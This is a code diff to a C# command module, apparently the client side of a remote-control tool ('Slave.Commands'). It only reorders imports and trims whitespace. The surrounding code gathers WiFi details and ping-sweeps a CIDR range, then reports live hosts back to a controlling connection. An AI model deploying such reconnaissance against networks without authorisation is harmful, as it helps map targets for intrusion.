@@ -1,4 +1,6 @@
-﻿using System;
+﻿using Shared;
+using Slave.Commands.Core;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -6,8 +8,6 @@ using System.Net;
 using System.Net.NetworkInformation;
 using System.Text;
 using System.Threading;
-using Shared;
-using Slave.Commands.Core;
 
 namespace Slave.Commands
 {
@@ -18,7 +18,6 @@ namespace Slave.Commands
         List<string> upHosts = new List<string>();
 
         static CountdownEvent countdown;
-
 
         public void Process(List<string> args)
         {
@@ -31,7 +30,6 @@ namespace Slave.Commands
                 Scan(args[1]);
             }
         }
-
 
         void WifiInfos()
         {
@@ -72,7 +70,6 @@ namespace Slave.Commands
             SlaveCommandsManager.networkManager.WriteLine(data);
         }
 
-
         void Scan(string ipMask)
         {
             upHosts.Clear();
@@ -82,14 +79,14 @@ namespace Slave.Commands
             for (int i = firstAndLastIpInt.Item1; i <= firstAndLastIpInt.Item2; i++)
             {
                 var bytes = BitConverter.GetBytes(i);
-                var  ip = new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
+                var ip = new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
                 var ping = new Ping();
                 ping.PingCompleted += PingCompletedEventHandler;
 
                 countdown.AddCount();
                 ping.SendAsync(ip, 100, ip);
             }
-            
+
             countdown.Signal();
             countdown.Wait();
 
@@ -108,9 +105,8 @@ namespace Slave.Commands
             countdown.Signal();
         }
 
-
         #region Ip calculations
-        
+
         static Tuple<int, int> GetFirstAndLastIpInt(string ipAndMask)
         {
             var separatorPos = ipAndMask.IndexOf('/');
@@ -135,7 +131,6 @@ namespace Slave.Commands
 
             return new Tuple<int, int>(ByteArrayIpToInt(startIPBytes), ByteArrayIpToInt(endIPBytes));
         }
-
 
         static int ByteArrayIpToInt(byte[] ip)
         {
